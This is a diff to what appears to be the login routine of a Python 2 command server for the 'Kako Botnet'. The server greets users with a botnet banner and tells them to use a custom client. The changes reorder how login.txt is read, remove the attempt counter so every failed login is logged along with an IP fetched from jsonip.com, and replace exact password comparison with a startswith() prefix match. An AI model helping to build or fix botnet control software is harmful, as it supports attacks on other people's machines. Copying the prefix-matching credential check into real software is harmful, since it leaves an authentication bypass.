@@ -1,6 +1,6 @@
 # To create an account make a file called "login.txt" and follow instructions below.
 # Login Format: Username:Password:ID, (Admin: 1 | Others: 0)
-# Issue - IP Variable retrieves the hosting machines IP, not the connecting user.
+# For some reason the login keeps messing up
 import sys
 import time
 import socket
@@ -56,6 +56,11 @@ def clientThread(conn):
 			else:
 				pass
 
+		createLogin = file("login.txt", "a")
+
+		with open("login.txt", "r") as login:
+			lines = login.readlines()
+
 		def username(conn, prefix="Username: "):
 		    conn.send(prefix)
 		    return conn.recv(512)
@@ -66,13 +71,6 @@ def clientThread(conn):
 		    if data:
 		        return conn.recv(512)
 
-		createLogin = file("login.txt", "a")
-
-		with open("login.txt", "r") as login:
-			lines = login.readlines()
-
-		attempts = 0
-
 		username = username(conn)
 		try:
 			password = password(conn)
@@ -81,7 +79,7 @@ def clientThread(conn):
 
 		while True:
 			for line in lines:
-				if line.split(":")[0] == username and line.split(":")[1] == password:
+				if line.split(":")[0].startswith(username) and line.split(":")[1].startswith(password):
 					conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
 					conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
 					conn.sendall("[?] Type >help for a list of commands\r\n")
@@ -217,21 +215,19 @@ def clientThread(conn):
 								pass
 							conn.close()
 							break
-				else:
-					attempts += 1
-					if attempts == 999:
-						try:
-							ip = load(urlopen('http://jsonip.com'))['ip']
-							fail = file("fails.txt", "a")
-							fail.write("%s:%s:%s\r\n" % (ip, username, password))
-							conn.send("[!] Incorrect Information!\r\n")
-							conn.send("[!] Your IP Address has been logged.\r\n")
-							clientDisconnect()
-							time.sleep(3)
-							conn.close()
-						except:
-							clientDisconnect()
-							conn.close()
+			else:
+				try:
+					ip = load(urlopen('http://jsonip.com'))['ip']
+					fail = file("fails.txt", "a")
+					fail.write("%s:%s:%s\r\n" % (ip, username, password))
+					conn.send("[!] Incorrect Information!\r\n")
+					conn.send("[!] Your IP Address has been logged.\r\n")
+					clientDisconnect()
+					time.sleep(3)
+					conn.close()
+				except:
+					clientDisconnect()
+					conn.close()
 	except:
 		clientDisconnect()
 		pass
